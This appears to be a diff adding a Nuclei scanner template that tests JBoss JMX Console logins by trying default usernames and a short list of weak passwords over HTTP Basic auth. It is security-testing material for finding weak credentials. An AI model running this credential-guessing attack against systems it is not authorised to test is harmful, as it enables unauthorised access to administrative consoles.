@@ -1,0 +1,52 @@
+http:
+    - attack: clusterbomb
+      matchers:
+        - dsl:
+            - '!contains(body_1, ''JMImplementation'') && contains(body_2, ''JMImplementation'')'
+          type: dsl
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        pass:
+            - admin
+            - 12345
+            - 123456
+            - 1234
+            - 123456789
+            - 123qwe
+            - root
+        user:
+            - admin
+            - root
+      raw:
+        - |
+          GET /jmx-console/ HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /jmx-console/ HTTP/1.1
+          Host: {{Hostname}}
+          Authorization: Basic {{base64(user + ':' + pass)}}
+      req-condition: true
+id: jmx-default-login
+info:
+    author: paradessia
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: JBoss JMX Console default login information was discovered.
+    metadata:
+        max-request: 28
+    name: JBoss JMX Console Weak Credential Discovery
+    reference:
+        - https://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/Administration_Console_User_Guide-Accessing_the_Console.html
+    severity: high
+    tags:
+        - jboss
+        - jmx
+        - default-login
+        - Cluster
+        - SAS
+        - Jboss
